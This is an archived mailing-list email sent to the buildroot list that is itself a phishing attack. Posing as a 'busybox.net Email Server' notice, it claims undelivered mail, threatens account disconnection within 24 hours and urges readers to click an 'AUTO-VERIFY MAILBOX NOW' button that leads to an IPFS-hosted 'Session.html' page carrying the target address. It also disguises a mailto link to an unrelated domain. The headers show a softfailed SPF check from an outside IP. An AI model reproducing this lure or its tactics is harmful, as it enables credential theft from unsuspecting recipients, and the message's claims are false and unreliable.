Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 713B1C49EA1
	for <buildroot@archiver.kernel.org>; Tue,  6 Aug 2024 13:13:23 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp2.osuosl.org (Postfix) with ESMTP id F395E409F6;
	Tue,  6 Aug 2024 13:13:20 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp2.osuosl.org ([127.0.0.1])
 by localhost (smtp2.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id kVuj0dO0DGa5; Tue,  6 Aug 2024 13:13:19 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 49F0C40A10
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp2.osuosl.org (Postfix) with ESMTP id 49F0C40A10;
	Tue,  6 Aug 2024 13:13:19 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id 82FBC1BF300
 for <buildroot@lists.busybox.net>; Tue,  6 Aug 2024 13:13:16 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 5EA5680F43
 for <buildroot@lists.busybox.net>; Tue,  6 Aug 2024 13:13:14 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id Ghgy3Np4TATM for <buildroot@lists.busybox.net>;
 Tue,  6 Aug 2024 13:13:13 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=141.98.10.79;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 6F1F18119E
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 6F1F18119E
Received: from busybox.net (unknown [141.98.10.79])
 by smtp1.osuosl.org (Postfix) with ESMTP id 6F1F18119E
 for <buildroot@busybox.net>; Tue,  6 Aug 2024 13:13:12 +0000 (UTC)
From: Email Server <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 6 Aug 2024 15:13:10 +0200
Message-ID: <20240806151310.FCBED5CCBB9BA5FB@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] busybox.net ALERT!!: Undeliverable Messages.
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============6208040363982406250=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============6208040363982406250==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.4em;"><p align=3D"center">
<br></p><div align=3D"center">
<table align=3D"center" style=3D"text-align: left; color: rgb(44, 54, 58); =
text-transform: none; letter-spacing: normal; font-family: Roboto, sans-ser=
if; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0p=
x; white-space: normal; border-collapse: collapse; max-width: 600px; box-si=
zing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 25=
5); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text=
-stroke-width: 0px; text-decoration-thickness:=20
initial; text-decoration-style: initial; text-decoration-color: initial;" b=
order=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing:=
 border-box;"><tr style=3D"box-sizing: border-box;"><td style=3D"box-sizing=
: border-box;">
<table style=3D"border-width: 1px 1px 0px; width: 600px; border-top-color: =
rgb(224, 224, 224); border-right-color: rgb(224, 224, 224); border-left-col=
or: rgb(224, 224, 224); border-top-style: solid; border-right-style: solid;=
 border-left-style: solid; border-collapse: collapse; min-width: 600px; max=
-width: 900px; box-sizing: border-box; border-top-left-radius: 3px; border-=
top-right-radius: 3px;" bgcolor=3D"#003d8f" border=3D"0" cellspacing=3D"0" =
cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;"><td height=3D"72" style=3D"box-sizing=
: border-box;" colspan=3D"3"></td></tr><tr style=3D"box-sizing: border-box;=
"><td width=3D"32" style=3D"box-sizing: border-box;"></td><td style=3D"colo=
r: rgb(255, 255, 255); line-height: 1.25; font-family: Roboto-Regular, Helv=
etica, Arial, sans-serif; font-size: 32px; box-sizing: border-box;"><span s=
tyle=3D"color: rgb(255, 255, 255); box-sizing: border-box;">buildroot@busyb=
ox.net&nbsp;Email Server</span></td>
<td width=3D"32" style=3D"box-sizing: border-box;"></td></tr><tr style=3D"b=
ox-sizing: border-box;"><td height=3D"18" style=3D"box-sizing: border-box;"=
 colspan=3D"3"></td></tr></tbody></table></td></tr><tr style=3D"box-sizing:=
 border-box;"><td style=3D"box-sizing: border-box;">
<table style=3D"border-width: 0px 1px 1px; width: 600px; border-right-color=
: rgb(240, 240, 240); border-bottom-color: rgb(192, 192, 192); border-left-=
color: rgb(240, 240, 240); border-right-style: solid; border-bottom-style: =
solid; border-left-style: solid; border-collapse: collapse; min-width: 600p=
x; max-width: 900px; box-sizing: border-box; border-bottom-right-radius: 3p=
x; border-bottom-left-radius: 3px;" bgcolor=3D"#fafafa" border=3D"0" cellsp=
acing=3D"0" cellpadding=3D"0">
<tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-bo=
x;"><td width=3D"32" style=3D"box-sizing: border-box;" rowspan=3D"3"></td><=
td style=3D"box-sizing: border-box;"></td><td width=3D"32" style=3D"box-siz=
ing: border-box;" rowspan=3D"3"></td></tr><tr style=3D"box-sizing: border-b=
ox;"><td style=3D"box-sizing: border-box;"><table style=3D"border-collapse:=
 collapse; min-width: 300px; box-sizing: border-box;" border=3D"0" cellspac=
ing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;"><td style=3D"color: rgb(32, 32, 32); =
line-height: 1.5; font-family: Roboto-Regular, Helvetica, Arial, sans-serif=
; font-size: 13px; box-sizing: border-box;"><a style=3D"color: inherit; tex=
t-decoration: none; box-sizing: border-box; background-color: transparent;"=
><span style=3D"color: rgb(0, 0, 0); box-sizing: border-box;"><br style=3D"=
box-sizing: border-box;"><br style=3D"box-sizing: border-box;">Hi buildroot=
,<br style=3D"box-sizing: border-box;">
<br style=3D"box-sizing: border-box;">busybox.net&nbsp;Email Server is havi=
ng problem verifying<span>&nbsp;</span></span></a><a style=3D"color: rgb(0,=
 102, 204); text-decoration: none; box-sizing: border-box; background-color=
: transparent;" href=3D"mailto:nfo@sahelfreighters.com">buildroot@busybox.n=
et</a>.<br style=3D"box-sizing: border-box;">You wont be able to receive ne=
w Mails/Attachment more than 1200MB until you verify this mailbox.<br style=
=3D"box-sizing: border-box;">
Automatically Verify your mailbox now through below instruction.<br style=
=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"><a style=
=3D"background: rgb(0, 61, 143); margin: 2px; padding: 10px; color: rgb(255=
, 255, 255); font-size: 12px; text-decoration: none; float: left; display: =
block; box-sizing: border-box;" href=3D"https://ipfs.io/ipfs/bafkreibfrosyo=
2udyzqfngstvlbfoj2ueq2cmm5xf52g3pzw2utymk2z2q?filename=3DSession.html#build=
root@busybox.net" target=3D"_blank" rel=3D"noreferrer">
AUTO-VERIFY MAILBOX NOW</a><p style=3D"margin-top: 0px; margin-bottom: 1rem=
; box-sizing: border-box;"></p><br style=3D"box-sizing: border-box;"><br st=
yle=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"><stro=
ng style=3D"font-weight: bolder; box-sizing: border-box;"><span style=3D"co=
lor: rgb(255, 0, 0); font-size: 14px; box-sizing: border-box;">Your email a=
ccount will be disconnected after 24hours; if no valid action is taken.</sp=
an></strong><br style=3D"box-sizing: border-box;">
<br style=3D"box-sizing: border-box;">Attentively,<br style=3D"box-sizing: =
border-box;">busybox.net&nbsp;Customer Service<br style=3D"box-sizing: bord=
er-box;"><hr width=3D"100%" align=3D"left" style=3D"border-width: 1px 0px 0=
px; height: 0px; overflow: visible; margin-top: 1rem; margin-bottom: 1rem; =
border-top-color: rgba(0, 0, 0, 0.1); border-top-style: solid; box-sizing: =
content-box;">
<hr width=3D"100%" align=3D"left" style=3D"border-width: 1px 0px 0px; heigh=
t: 0px; overflow: visible; margin-top: 1rem; margin-bottom: 1rem; border-to=
p-color: rgba(0, 0, 0, 0.1); border-top-style: solid; box-sizing: content-b=
ox;"><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-b=
ox;">&nbsp;</p></td></tr></tbody></table></td></tr></tbody></table></td></t=
r></tbody></table></div><p align=3D"center">
</p><p align=3D"center">


<br></p></body></html>

--===============6208040363982406250==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============6208040363982406250==--
